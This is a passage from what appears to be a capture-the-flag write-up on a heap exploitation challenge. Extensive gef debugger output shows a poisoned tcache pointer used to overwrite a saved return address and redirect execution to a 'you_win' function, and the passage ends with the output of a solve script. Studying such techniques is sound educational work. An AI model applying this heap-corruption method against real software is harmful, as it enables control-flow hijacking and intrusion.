0x56270e6ef170:    0x0    0x0
0x56270e6ef180:    0x0    0x0
0x56270e6ef190:    0x0    0x0
0x56270e6ef1a0:    0x0    0x0
0x56270e6ef1b0:    0x0    0x0
0x56270e6ef1c0:    0x0    0x0
0x56270e6ef1d0:    0x0    0x0
0x56270e6ef1e0:    0x0    0x0
0x56270e6ef1f0:    0x0    0x0
0x56270e6ef200:    0x0    0x0
0x56270e6ef210:    0x0    0x0
0x56270e6ef220:    0x0    0x0
0x56270e6ef230:    0x0    0x0
0x56270e6ef240:    0x0    0x0
0x56270e6ef250:    0x0    0x0
0x56270e6ef260:    0x0    0x0
0x56270e6ef270:    0x0    0x0
0x56270e6ef280:    0x0    0x0
gef➤  x/x 0x56226c1fcc8c
0x56226c1fcc8c:    Cannot access memory at address 0x56226c1fcc8c
```

So we see, at `0x56270ca4c068`, is a ptr to our `chunks` array (`0x56270ca4c040`). Also, we take note, the current head ptr for the tcache we allocated from is `0x56226c1fcc8c`, which isn't a valid ptr. Subsequent attempts to either insert/remove chunks from that bin will likely cause the program to crash.

Since we have our ptr to `chunks`, let's go ahead, and overwrite the first ptr stored, with the address of the return address for `edit_chunk`:

```
gef➤  x/20g 0x56270ca4c040
0x56270ca4c040 <chunks>:    0x7ffeb45bfcf8    0xa
0x56270ca4c050 <chunks+16>:    0x56270e6f0bd0    0x56270e6f1170
0x56270ca4c060 <chunks+32>:    0x56270e6f0bd0    0x56270ca4c040
0x56270ca4c070 <chunks+48>:    0x0    0x0
0x56270ca4c080 <chunks+64>:    0x0    0x0
0x56270ca4c090:    0x0    0x0
0x56270ca4c0a0 <chunk_sizes>:    0x50000000500    0x8000000080
0x56270ca4c0b0 <chunk_sizes+16>:    0x8000000080    0x0
0x56270ca4c0c0 <chunk_sizes+32>:    0x0    0x0
0x56270ca4c0d0:    0x0    0x0
gef➤  vmmap 0x7ffeb45bfcf8
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x00007ffeb45a0000 0x00007ffeb45c1000 0x0000000000000000 rw- [stack]
gef➤  disas edit_chunk
Dump of assembler code for function edit_chunk:
   0x000056270ca495aa <+0>:    endbr64
   0x000056270ca495ae <+4>:    push   rbp
   0x000056270ca495af <+5>:    mov	rbp,rsp
   0x000056270ca495b2 <+8>:    sub	rsp,0x10
   0x000056270ca495b6 <+12>:    lea	rax,[rip+0xca6]    	# 0x56270ca4a263
   0x000056270ca495bd <+19>:    mov	rdi,rax
   0x000056270ca495c0 <+22>:    call   0x56270ca490c0 <puts@plt>
   0x000056270ca495c5 <+27>:    call   0x56270ca4935d <get_chunk_idx>
   0x000056270ca495ca <+32>:    mov	DWORD PTR [rbp-0x10],eax
   0x000056270ca495cd <+35>:    cmp	DWORD PTR [rbp-0x10],0xffffffff
   0x000056270ca495d1 <+39>:    jne	0x56270ca495e4 <edit_chunk+58>
   0x000056270ca495d3 <+41>:    lea	rax,[rip+0xc57]    	# 0x56270ca4a231
   0x000056270ca495da <+48>:    mov	rdi,rax
   0x000056270ca495dd <+51>:    call   0x56270ca490c0 <puts@plt>
   0x000056270ca495e2 <+56>:    jmp	0x56270ca4964c <edit_chunk+162>
   0x000056270ca495e4 <+58>:    mov	eax,DWORD PTR [rbp-0x10]
   0x000056270ca495e7 <+61>:    lea	rdx,[rax*8+0x0]
   0x000056270ca495ef <+69>:    lea	rax,[rip+0x2a4a]    	# 0x56270ca4c040 <chunks>
   0x000056270ca495f6 <+76>:    mov	rax,QWORD PTR [rdx+rax*1]
   0x000056270ca495fa <+80>:    mov	QWORD PTR [rbp-0x8],rax
   0x000056270ca495fe <+84>:    mov	eax,DWORD PTR [rbp-0x10]
   0x000056270ca49601 <+87>:    lea	rdx,[rax*4+0x0]
   0x000056270ca49609 <+95>:    lea	rax,[rip+0x2a90]    	# 0x56270ca4c0a0 <chunk_sizes>
   0x000056270ca49610 <+102>:    mov	eax,DWORD PTR [rdx+rax*1]
   0x000056270ca49613 <+105>:    mov	DWORD PTR [rbp-0xc],eax
   0x000056270ca49616 <+108>:    lea	rax,[rip+0xc5b]    	# 0x56270ca4a278
   0x000056270ca4961d <+115>:    mov	rdi,rax
   0x000056270ca49620 <+118>:    call   0x56270ca490c0 <puts@plt>
   0x000056270ca49625 <+123>:    mov	rdx,QWORD PTR [rip+0x29f4]    	# 0x56270ca4c020 <stdin@GLIBC_2.2.5>
   0x000056270ca4962c <+130>:    mov	ecx,DWORD PTR [rbp-0xc]
   0x000056270ca4962f <+133>:    mov	rax,QWORD PTR [rbp-0x8]
   0x000056270ca49633 <+137>:    mov	esi,ecx
   0x000056270ca49635 <+139>:    mov	rdi,rax
   0x000056270ca49638 <+142>:    call   0x56270ca490f0 <fgets@plt>
   0x000056270ca4963d <+147>:    lea	rax,[rip+0xc55]    	# 0x56270ca4a299
   0x000056270ca49644 <+154>:    mov	rdi,rax
   0x000056270ca49647 <+157>:    call   0x56270ca490c0 <puts@plt>
   0x000056270ca4964c <+162>:    leave  
   0x000056270ca4964d <+163>:    ret    
End of assembler dump.
gef➤  b *edit_chunk+139
Breakpoint 3 at 0x56270ca49635
gef➤  b *edit_chunk+147
Breakpoint 4 at 0x56270ca4963d
gef➤  c
```

So here, we see that we overwrite the first entry of the `chunks` array with `0x7ffeb45bfcf8` (stack address of the `edit_chunks` function). Also for this last part, I had to rerun the exploit again, so ASLR will cause the addresses to be different. However the premise is still the same. The `0x7ffeb45bfcf8` is now instead `0x7fff9222df58`. Let's see what it looks like, when `fgets` overwrites the saved return address:

```
Breakpoint 1, 0x000055cd02667638 in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────── registers ────
$rax   : 0x00007fff9222df58  →  0x000055cd02667274  →  <main+107> jmp 0x55cd02667215 <main+12>
$rbx   : 0x0          	 
$rcx   : 0x500        	 
$rdx   : 0x00007fbda862cac0  →  0x00000000fbad2088
$rsp   : 0x00007fff9222df40  →  0x0000050000000000
$rbp   : 0x00007fff9222df50  →  0x00007fff9222df70  →  0x0000000000000001
$rsi   : 0x500        	 
$rdi   : 0x00007fff9222df58  →  0x000055cd02667274  →  <main+107> jmp 0x55cd02667215 <main+12>
$rip   : 0x000055cd02667638  →  <edit_chunk+142> call 0x55cd026670f0 <fgets@plt>
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x00007fff9222dcd7  →  0x007fbda844f2b200
$r11   : 0x202        	 
$r12   : 0x00007fff9222e088  →  0x00007fff9222f486  →  "./chall-00"
$r13   : 0x000055cd02667209  →  <main+0> endbr64
$r14   : 0x000055cd02669d80  →  0x000055cd026671c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007fbda879e020  →  0x00007fbda879f2e0  →  0x000055cd02666000  →   jg 0x55cd02666047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
───────────────────────────────────────────────────────────────────── stack ────
0x00007fff9222df40│+0x0000: 0x0000050000000000     ← $rsp
0x00007fff9222df48│+0x0008: 0x00007fff9222df58  →  0x000055cd02667274  →  <main+107> jmp 0x55cd02667215 <main+12>
0x00007fff9222df50│+0x0010: 0x00007fff9222df70  →  0x0000000000000001     ← $rbp
0x00007fff9222df58│+0x0018: 0x000055cd02667274  →  <main+107> jmp 0x55cd02667215 <main+12>     ← $rax, $rdi
0x00007fff9222df60│+0x0020: 0x0000000000000000
0x00007fff9222df68│+0x0028: 0x00000003a8786080
0x00007fff9222df70│+0x0030: 0x0000000000000001
0x00007fff9222df78│+0x0038: 0x00007fbda8423fbd  →  <__libc_start_call_main+109> mov edi, eax
─────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55cd0266762f <edit_chunk+133> mov	rax, QWORD PTR [rbp-0x8]
   0x55cd02667633 <edit_chunk+137> mov	esi, ecx
   0x55cd02667635 <edit_chunk+139> mov	rdi, rax
 → 0x55cd02667638 <edit_chunk+142> call   0x55cd026670f0 <fgets@plt>
   ↳  0x55cd026670f0 <fgets@plt+0>	endbr64
  	0x55cd026670f4 <fgets@plt+4>	bnd	jmp QWORD PTR [rip+0x2ec5]    	# 0x55cd02669fc0 <fgets@got.plt>
  	0x55cd026670fb <fgets@plt+11>   nop	DWORD PTR [rax+rax*1+0x0]
  	0x55cd02667100 <malloc@plt+0>   endbr64
  	0x55cd02667104 <malloc@plt+4>   bnd	jmp QWORD PTR [rip+0x2ebd]    	# 0x55cd02669fc8 <malloc@got.plt>
  	0x55cd0266710b <malloc@plt+11>  nop	DWORD PTR [rax+rax*1+0x0]
─────────────────────────────────────────────────────── arguments (guessed) ────
fgets@plt (
   $rdi = 0x00007fff9222df58 → 0x000055cd02667274 → <main+107> jmp 0x55cd02667215 <main+12>,
   $rsi = 0x0000000000000500,
   $rdx = 0x00007fbda862cac0 → 0x00000000fbad2088,
   $rcx = 0x0000000000000500
)
─────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x55cd02667638 in edit_chunk (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55cd02667638 → edit_chunk()
[#1] 0x55cd02667274 → main()
────────────────────────────────────────────────────────────────────────────────
gef➤  i f
Stack level 0, frame at 0x7fff9222df60:
 rip = 0x55cd02667638 in edit_chunk; saved rip = 0x55cd02667274
 called by frame at 0x7fff9222df80
 Arglist at 0x7fff9222df50, args:
 Locals at 0x7fff9222df50, Previous frame's sp is 0x7fff9222df60
 Saved registers:
  rbp at 0x7fff9222df50, rip at 0x7fff9222df58
gef➤  x/g 0x7fff9222df58
0x7fff9222df58:    0x55cd02667274
gef➤  x/g 0x55cd02667274
0x55cd02667274 <main+107>:    0xc7504fc7d839feb
gef➤  c
Continuing.

Breakpoint 2, 0x000055cd0266764c in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19         	 
$rbx   : 0x0          	 
$rcx   : 0x00007fbda84f53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0          	 
$rsp   : 0x00007fff9222df40  →  0x0000050000000000
$rbp   : 0x00007fff9222df50  →  0x00007fff9222df70  →  0x0000000000000001
$rsi   : 0x000055cd03a732a0  →  "\nChunk has been edited!\nontent:\n View Chunk\n3.[...]"
$rdi   : 0x00007fbda862e8f0  →  0x0000000000000000
$rip   : 0x000055cd0266764c  →  <edit_chunk+162> leave
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x00007fff9222dcd7  →  0x007fbda844f2b200
$r11   : 0x202        	 
$r12   : 0x00007fff9222e088  →  0x00007fff9222f486  →  "./chall-00"
$r13   : 0x000055cd02667209  →  <main+0> endbr64
$r14   : 0x000055cd02669d80  →  0x000055cd026671c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007fbda879e020  →  0x00007fbda879f2e0  →  0x000055cd02666000  →   jg 0x55cd02666047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff9222df40│+0x0000: 0x0000050000000000     ← $rsp
0x00007fff9222df48│+0x0008: 0x00007fff9222df58  →  0x000055cd026672d0  →  <you_win+0> endbr64
0x00007fff9222df50│+0x0010: 0x00007fff9222df70  →  0x0000000000000001     ← $rbp
0x00007fff9222df58│+0x0018: 0x000055cd026672d0  →  <you_win+0> endbr64
0x00007fff9222df60│+0x0020: 0x000000000000000a ("\n"?)
0x00007fff9222df68│+0x0028: 0x00000003a8786080
0x00007fff9222df70│+0x0030: 0x0000000000000001
0x00007fff9222df78│+0x0038: 0x00007fbda8423fbd  →  <__libc_start_call_main+109> mov edi, eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55cd0266763d <edit_chunk+147> lea	rax, [rip+0xc55]    	# 0x55cd02668299
   0x55cd02667644 <edit_chunk+154> mov	rdi, rax
   0x55cd02667647 <edit_chunk+157> call   0x55cd026670c0 <puts@plt>
 → 0x55cd0266764c <edit_chunk+162> leave  
   0x55cd0266764d <edit_chunk+163> ret    
   0x55cd0266764e <free_chunk+0>   endbr64
   0x55cd02667652 <free_chunk+4>   push   rbp
   0x55cd02667653 <free_chunk+5>   mov	rbp, rsp
   0x55cd02667656 <free_chunk+8>   sub	rsp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x55cd0266764c in edit_chunk (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55cd0266764c → edit_chunk()
[#1] 0x55cd026672d0 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x/g 0x7fff9222df58
0x7fff9222df58:    0x55cd026672d0
gef➤  x/g 0x55cd026672d0
0x55cd026672d0 <you_win>:    0xe5894855fa1e0ff3
gef➤  i f
Stack level 0, frame at 0x7fff9222df60:
 rip = 0x55cd0266764c in edit_chunk; saved rip = 0x55cd026672d0
 called by frame at 0x7fff9222df80
 Arglist at 0x7fff9222df50, args:
 Locals at 0x7fff9222df50, Previous frame's sp is 0x7fff9222df60
 Saved registers:
  rbp at 0x7fff9222df50, rip at 0x7fff9222df58
gef➤  si
0x000055cd0266764d in edit_chunk ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19         	 
$rbx   : 0x0          	 
$rcx   : 0x00007fbda84f53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0          	 
$rsp   : 0x00007fff9222df58  →  0x000055cd026672d0  →  <you_win+0> endbr64
$rbp   : 0x00007fff9222df70  →  0x0000000000000001
$rsi   : 0x000055cd03a732a0  →  "\nChunk has been edited!\nontent:\n View Chunk\n3.[...]"
$rdi   : 0x00007fbda862e8f0  →  0x0000000000000000
$rip   : 0x000055cd0266764d  →  <edit_chunk+163> ret
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x00007fff9222dcd7  →  0x007fbda844f2b200
$r11   : 0x202        	 
$r12   : 0x00007fff9222e088  →  0x00007fff9222f486  →  "./chall-00"
$r13   : 0x000055cd02667209  →  <main+0> endbr64
$r14   : 0x000055cd02669d80  →  0x000055cd026671c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007fbda879e020  →  0x00007fbda879f2e0  →  0x000055cd02666000  →   jg 0x55cd02666047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff9222df58│+0x0000: 0x000055cd026672d0  →  <you_win+0> endbr64      ← $rsp
0x00007fff9222df60│+0x0008: 0x000000000000000a ("\n"?)
0x00007fff9222df68│+0x0010: 0x00000003a8786080
0x00007fff9222df70│+0x0018: 0x0000000000000001     ← $rbp
0x00007fff9222df78│+0x0020: 0x00007fbda8423fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007fff9222df80│+0x0028: 0x00007fbda876a000  →  0x03010102464c457f
0x00007fff9222df88│+0x0030: 0x000055cd02667209  →  <main+0> endbr64
0x00007fff9222df90│+0x0038: 0x000000019222e070
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55cd02667644 <edit_chunk+154> mov	rdi, rax
   0x55cd02667647 <edit_chunk+157> call   0x55cd026670c0 <puts@plt>
   0x55cd0266764c <edit_chunk+162> leave  
 → 0x55cd0266764d <edit_chunk+163> ret    
   ↳  0x55cd026672d0 <you_win+0>  	endbr64
  	0x55cd026672d4 <you_win+4>  	push   rbp
  	0x55cd026672d5 <you_win+5>  	mov	rbp, rsp
  	0x55cd026672d8 <you_win+8>  	lea	rax, [rip+0xdb8]    	# 0x55cd02668097
  	0x55cd026672df <you_win+15> 	mov	rdi, rax
  	0x55cd026672e2 <you_win+18> 	call   0x55cd026670c0 <puts@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x55cd0266764d in edit_chunk (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55cd0266764d → edit_chunk()
[#1] 0x55cd026672d0 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  si
0x000055cd026672d0 in you_win ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x19         	 
$rbx   : 0x0          	 
$rcx   : 0x00007fbda84f53b4  →  0x5477fffff0003d48 ("H="?)
$rdx   : 0x0          	 
$rsp   : 0x00007fff9222df60  →  0x000000000000000a ("\n"?)
$rbp   : 0x00007fff9222df70  →  0x0000000000000001
$rsi   : 0x000055cd03a732a0  →  "\nChunk has been edited!\nontent:\n View Chunk\n3.[...]"
$rdi   : 0x00007fbda862e8f0  →  0x0000000000000000
$rip   : 0x000055cd026672d0  →  <you_win+0> endbr64
$r8	: 0x0          	 
$r9	: 0x0          	 
$r10   : 0x00007fff9222dcd7  →  0x007fbda844f2b200
$r11   : 0x202        	 
$r12   : 0x00007fff9222e088  →  0x00007fff9222f486  →  "./chall-00"
$r13   : 0x000055cd02667209  →  <main+0> endbr64
$r14   : 0x000055cd02669d80  →  0x000055cd026671c0  →  <__do_global_dtors_aux+0> endbr64
$r15   : 0x00007fbda879e020  →  0x00007fbda879f2e0  →  0x000055cd02666000  →   jg 0x55cd02666047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fff9222df60│+0x0000: 0x000000000000000a ("\n"?)     ← $rsp
0x00007fff9222df68│+0x0008: 0x00000003a8786080
0x00007fff9222df70│+0x0010: 0x0000000000000001     ← $rbp
0x00007fff9222df78│+0x0018: 0x00007fbda8423fbd  →  <__libc_start_call_main+109> mov edi, eax
0x00007fff9222df80│+0x0020: 0x00007fbda876a000  →  0x03010102464c457f
0x00007fff9222df88│+0x0028: 0x000055cd02667209  →  <main+0> endbr64
0x00007fff9222df90│+0x0030: 0x000000019222e070
0x00007fff9222df98│+0x0038: 0x00007fff9222e088  →  0x00007fff9222f486  →  "./chall-00"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x55cd026672c1 <main+184>   	mov	eax, 0x0
   0x55cd026672c6 <main+189>   	call   0x55cd026670e0 <printf@plt>
   0x55cd026672cb <main+194>   	jmp	0x55cd02667215 <main+12>
 → 0x55cd026672d0 <you_win+0>  	endbr64
   0x55cd026672d4 <you_win+4>  	push   rbp
   0x55cd026672d5 <you_win+5>  	mov	rbp, rsp
   0x55cd026672d8 <you_win+8>  	lea	rax, [rip+0xdb8]    	# 0x55cd02668097
   0x55cd026672df <you_win+15> 	mov	rdi, rax
   0x55cd026672e2 <you_win+18> 	call   0x55cd026670c0 <puts@plt>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall-00", stopped 0x55cd026672d0 in you_win (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x55cd026672d0 → you_win()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Just like that, we see that we were able to leverage that arbitrary write, into code execution, and call the `you_win` function!

Here is what it looks like when we just run the script normally:

```
$    python3 solve-00.py
[+] Starting local process './chall-00': pid 112849
Stack Leak is: 0x7ffc5f11a870
Heap Leak is: 0x562e0c52e6b0
PIE Leak is: 0x562e0c01173d
Mangled Next is: 0x562b6ee1856e
Stack Target is: 0x7ffc5f11a8a8
Win Address is: 0x562e0c0112d0
Chunks Address is: 0x562e0c014040
[*] Switching to interactive mode


Chunk has been edited!

Call this function to win!


You Win


[*] Got EOF while reading in interactive
$  
```
